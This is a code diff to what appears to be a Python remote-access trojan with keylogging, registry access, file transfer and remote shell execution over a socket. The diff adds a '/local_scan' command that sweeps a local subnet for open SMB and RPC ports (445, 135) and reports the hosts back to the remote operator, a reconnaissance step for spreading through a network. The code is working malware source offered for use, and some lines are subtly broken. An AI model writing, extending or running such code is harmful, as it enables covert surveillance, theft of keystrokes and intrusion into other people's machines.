@@ -3,8 +3,9 @@ from pynput import keyboard
 from pathlib import Path
 from time import time
 
-
+import concurrent.futures
 import subprocess
+import threading
 import shutil
 import socket
 import winreg
@@ -25,6 +26,38 @@ buffer_auto_send_pending = False
 keylloger_active = False
 listener = None
 
+
+def tcp_scanner(base_ip, c):
+    open_host = []
+    ports_to_check = [445, 135]
+    
+    def scan_host(ip):
+        try:
+            for port in ports_to_check:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.timeout(.5)
+                result = sock.connect_ex((ip, port))
+                sock.close()
+                if result == 0:
+                    return f'[+] {ip:<16}   {port}'
+            return None
+        except socket.gaierror:
+            c.send(b'\n[-] The IP network does not exist or is unreachable.\n\n')
+    
+    ips_to_scan = [f'{base_ip}.{i}' for i in range(1, 255)]
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+        results = executor.map(scan_host, ips_to_scan)
+    
+    for r in results:
+        if r:
+            open_host.append(r)
+    
+    if open_host:
+        final_result = '\n'.join(open_host)
+        c.send(f'\n[+] Active hosts:    [ open port ]\n{final_result}\n\n'.encode())
+    else:
+        c.send(b'\n[-] No active hosts found on target ports.\n\n')
 
 def dowload_file(filepath):
     try:
@@ -351,6 +384,18 @@ def cmd(c, data):
                 c.send(f'[-] Upload Failed: {result['error']}\n\n'.encode())
                 return
         
+        elif data.startswith('/local_scan '):
+            parts = data.split()
+            if len(parts) == 2:
+                base_ip = parts[1].rstrip('.')
+                scan_thread = threading.Thread(target=tcp_scanner, args=(base_ip, c))
+                scan_thread.daemon = True
+                scan_thread.start()
+            else:
+                c.send('[-] Usage: /local_scan <ex: 192.169.1>')
+                return
+            
+            
         else:
             
             p = subprocess.Popen(
